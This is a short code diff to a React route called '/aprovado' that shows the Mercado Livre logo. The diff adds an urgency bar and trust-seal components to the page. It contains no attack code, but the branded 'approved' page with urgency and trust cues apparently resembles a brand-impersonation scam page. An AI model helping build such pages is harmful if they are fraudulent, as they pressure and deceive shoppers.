@@ -1,5 +1,7 @@
 import { createFileRoute, useNavigate } from "@tanstack/react-router";
 import mlLogo from "@/assets/mercado-livre-logo.png";
+import { UrgencyBar } from "@/components/UrgencyBar";
+import { TrustSeals } from "@/components/TrustSeals";
 
 export const Route = createFileRoute("/aprovado")({
   head: () => ({
@@ -38,6 +40,7 @@ function Aprovado() {
       <div className="bg-[#FFE600] w-full py-3 flex justify-center items-center shadow-sm">
         <img src={mlLogo} alt="Mercado Livre" className="h-9 object-contain" />
       </div>
+      <UrgencyBar />
 
       {/* Decorative circles */}
       <div className="absolute w-72 h-72 rounded-full bg-[#FFE600]/20 -top-20 -right-20 z-0" />
@@ -73,6 +76,7 @@ function Aprovado() {
             Continuar
           </button>
         </div>
+        <TrustSeals />
       </main>
 
       <footer className="text-center text-xs text-gray-500 py-6 relative z-10">
